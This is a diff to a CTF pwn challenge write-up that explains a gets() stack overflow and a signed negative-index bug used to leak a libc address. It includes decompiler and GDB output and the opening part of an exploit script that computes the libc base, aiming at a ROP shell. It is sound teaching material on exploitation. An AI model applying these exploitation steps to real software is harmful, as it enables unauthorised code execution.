@@ -8,7 +8,7 @@ We are given binary files `chal1`, `libc.so.6,` and `ld-linux-x86-64.so.2`.
 * `libc.so.6` is the C standard library used by `chal1`.
 * `ld-linux-x86-64.so.2` is the dynamic linker for the specific version of the given libc binary.
 
-For fun, you can run the libc binary with the ld-linux.so linker to see the libc version.
+This is unnecessary, but for fun, we can run the libc binary with the ld-linux.so linker to see the libc version.
 
 ```
 ./ld-linux-x86-64.so.2 ./libc.so.6
@@ -48,6 +48,8 @@ void disable_buffers(void)
   return;
 }
 
+...
+
 undefined8 main(void)
 {
   char local_98 [0x40];
@@ -73,17 +75,33 @@ undefined8 main(void)
   puts("See you soon!");
   return 0x0;
 }
+
+...
+
+                             DAT_00102056                                    XREF[2]:     main:00101234(*), 
+                                                                                          main:0010123b(*)  
+        00102056 25              ??         25h    %
+        00102057 64              ??         64h    d
+        00102058 00              ??         00h
+
+...
+
+                             DAT_00102083                                    XREF[2]:     main:00101263(*), 
+                                                                                          main:0010126a(*)  
+        00102083 25              ??         25h    %
+        00102084 75              ??         75h    u
+        00102085 00              ??         00h
 ```
 
 We can ignore the `disable_buffers` function. Disabling the standard IO streams is very common in CTF pwn challenges. What is very interesting is the use of `gets` in `main`, which makes `main` vulnerable because `gets` writes to a buffer without checking the bound of the buffer. `local_98` is a stack buffer, so we can use `gets` to achieve a stack buffer overflow and overwrite the return address of `main`.
 
-A stack buffer overflow often allows ROP (return oriented programming), especially when the stack is non-executable. The stack is indeed non-executable in our case, since the `checksec` command indicated that NX is enabled. To use ROP to open a shell, which is our goal, we can call the `system` function in libc with the argument `/bin/sh`. Therefore, we want to know the address of `system` in the process virtual memory, so that we can write the address of `system` as a return address on the stack. However, the `system` address will be randomized because of ASLR.
+An unbounded stack buffer overflow often allows ROP (return oriented programming), which is especially useful when the stack is non-executable. The stack is indeed non-executable in our case, since the `checksec` command indicated that NX is enabled. To use ROP to open a shell, which is our goal, we can call the `system` function in libc with the argument `/bin/sh`. Therefore, we want to know the address of `system` in the process virtual memory, so that we can write the address of `system` as a return address on the stack. However, the `system` address will be randomized because of ASLR.
 
 ## Leaking a libc address
 
 To defeat ASLR and get the address of the `system` function in the process virtual memory, we can make the program output a memory address in libc (called a libc leak). With ASLR, objects in virtual memory (such as the program code or libc) are shifted by a random amount, so once we know a leaked address of some data in libc, the base address of libc will be a constant offset away from the leaked address. With the base libc address, we will be able to correctly compute the address of any other item in libc, such as `system`.
 
-Indeed, it is possible to make the program output a libc leak. Let's run the program under GDB with `gdb chal1`, set a breakpoint on `main` with `b main`, run until the breakpoint with `r`, and disassemble the `main` function with `disas` (we can do this because the binary is not stripped).
+Indeed, it is possible to make the program output a libc leak. Let's run the program under GDB with `gdb chal1`, set a breakpoint on `main` with `b main`, run until the breakpoint with `r`, and disassemble the `main` function with `disas` (`disas` works here because the binary is not stripped).
 
 ```
 gef➤  disas
@@ -159,7 +177,7 @@ Dump of assembler code for function main:
 > [!NOTE]
 > The addresses that you see in GDB when running `gdb <program>` are not randomized by default. You can enable randomization by running `set disable-randomization off` before `r`unning the program in GDB.
 
-At address 0x55555555520f (0x520f for short), we can actually see the address of the `name` buffer, which is 0x80a0. Since the binary is not stripped, the address of the `name` buffer can also be found with `i addr name`.
+At address 0x55555555520f (0x520f for short), we can see the address of the `name` buffer, which is 0x80a0. Since the binary is not stripped, the address of the `name` buffer can also be found with `i addr name`.
 
 Let's also run `i file` to list the program sections to see if there's something interesting about the address of `name`.
 
@@ -241,6 +259,89 @@ gef➤
 ```
 
 > [!TIP]
-> In GDB, hitting enter after a memory inspection command, such as `x` or `hex` (in GEF), repeats the command but for the next block of memory.
+> In GDB, hitting enter after a memory inspection command, such as `x` or `hex` (in GEF), repeats the command for the next block of memory.
+
+Notice that at 0x20 (32) bytes before the `name` buffer, we have the value of `stderr`. "GLIBC" is part of the symbol name, and we can verify that the address is in libc by checking the virtual memory mapping of the process.
+
+```
+gef➤  vmmap
+[ Legend:  Code | Heap | Stack ]
+Start              End                Offset             Perm Path
+0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /home/carson/dev/utahsec-challenges/2024-11-14/chal1/chal1
+0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /home/carson/dev/utahsec-challenges/2024-11-14/chal1/chal1
+0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /home/carson/dev/utahsec-challenges/2024-11-14/chal1/chal1
+0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /home/carson/dev/utahsec-challenges/2024-11-14/chal1/chal1
+0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /home/carson/dev/utahsec-challenges/2024-11-14/chal1/chal1
+0x00007ffff7c00000 0x00007ffff7c28000 0x0000000000000000 r-- /home/carson/dev/utahsec-challenges/2024-11-14/chal1/libc.so.6
+0x00007ffff7c28000 0x00007ffff7dbd000 0x0000000000028000 r-x /home/carson/dev/utahsec-challenges/2024-11-14/chal1/libc.so.6
+0x00007ffff7dbd000 0x00007ffff7e15000 0x00000000001bd000 r-- /home/carson/dev/utahsec-challenges/2024-11-14/chal1/libc.so.6
+0x00007ffff7e15000 0x00007ffff7e16000 0x0000000000215000 --- /home/carson/dev/utahsec-challenges/2024-11-14/chal1/libc.so.6
+0x00007ffff7e16000 0x00007ffff7e1a000 0x0000000000215000 r-- /home/carson/dev/utahsec-challenges/2024-11-14/chal1/libc.so.6
+0x00007ffff7e1a000 0x00007ffff7e1c000 0x0000000000219000 rw- /home/carson/dev/utahsec-challenges/2024-11-14/chal1/libc.so.6
+0x00007ffff7e1c000 0x00007ffff7e29000 0x0000000000000000 rw- 
+0x00007ffff7fb8000 0x00007ffff7fbd000 0x0000000000000000 rw- 
+0x00007ffff7fbd000 0x00007ffff7fc1000 0x0000000000000000 r-- [vvar]
+0x00007ffff7fc1000 0x00007ffff7fc3000 0x0000000000000000 r-x [vdso]
+0x00007ffff7fc3000 0x00007ffff7fc5000 0x0000000000000000 r-- /home/carson/dev/utahsec-challenges/2024-11-14/chal1/ld-linux-x86-64.so.2
+0x00007ffff7fc5000 0x00007ffff7fef000 0x0000000000002000 r-x /home/carson/dev/utahsec-challenges/2024-11-14/chal1/ld-linux-x86-64.so.2
+0x00007ffff7fef000 0x00007ffff7ffa000 0x000000000002c000 r-- /home/carson/dev/utahsec-challenges/2024-11-14/chal1/ld-linux-x86-64.so.2
+0x00007ffff7ffb000 0x00007ffff7ffd000 0x0000000000037000 r-- /home/carson/dev/utahsec-challenges/2024-11-14/chal1/ld-linux-x86-64.so.2
+0x00007ffff7ffd000 0x00007ffff7fff000 0x0000000000039000 rw- /home/carson/dev/utahsec-challenges/2024-11-14/chal1/ld-linux-x86-64.so.2
+0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
+0xffffffffff600000 0xffffffffff601000 0x0000000000000000 --x [vsyscall]
+```
+
+The virtual memory mapping also gives us the base address of libc for this process, which is 0x7ffff7c00000.
+
+How can we make the program output the data at `name-0x20`? This program has a subtle bug that we can take advantage here. Let's take another look at the decompilation:
+
+```
+int local_c;
+
+...
+
+puts("What starting index for a name substring do you want?");
+__isoc99_scanf(&DAT_00102056,&local_c);
+
+...
+
+strncpy(local_58,name + local_c,(ulong)local_10);
+
+...
+
+                             DAT_00102056                                    XREF[2]:     main:00101234(*), 
+                                                                                          main:0010123b(*)  
+        00102056 25              ??         25h    %
+        00102057 64              ??         64h    d
+        00102058 00              ??         00h
+```
+
+The source buffer of the string copy is `name + local_c`, and the type of `local_c` is `int`... a *signed* int. The starting index `local_c` can be negative, and we can input a negative index, because the call to `scanf` has a format string of `%d`. If `local_c` is -0x20, then the destination buffer `local_58` will contain the bytes of the libc address at `name-0x20`! Note that since addresses are 64 bits on x86-64, the length needs to be 8. After `local_58` is printed, we will have a libc address leak.
+
+> [!NOTE]
+> Negative indexing is a subtle and clever trick that I have seen in a few CTF pwn challenges, which is why I decided to include it in this challenge.
+
+We write the first part of the exploit script to get the libc base address:
+
+```
+# "What is your name?"
+print(conn.recvline())
+conn.sendline(b"asdf")
+
+# "What starting index for a name substring do you want?"
+print(conn.recvline())
+conn.sendline(b"-32")
+
+# "What substring length do you want?"
+print(conn.recvline())
+conn.sendline(b"8")
+
+# "Here is your substring:"
+print(conn.recvline())
+line = conn.recvline(keepends=False)
+libc_leak_addr = int.from_bytes(line, "little")
+libc_base_addr = libc_leak_addr - 0x7ffff7e1b6a0 + 0x7ffff7c00000
+print(f"libc_base_addr {hex(libc_base_addr)}")
+```
 
 
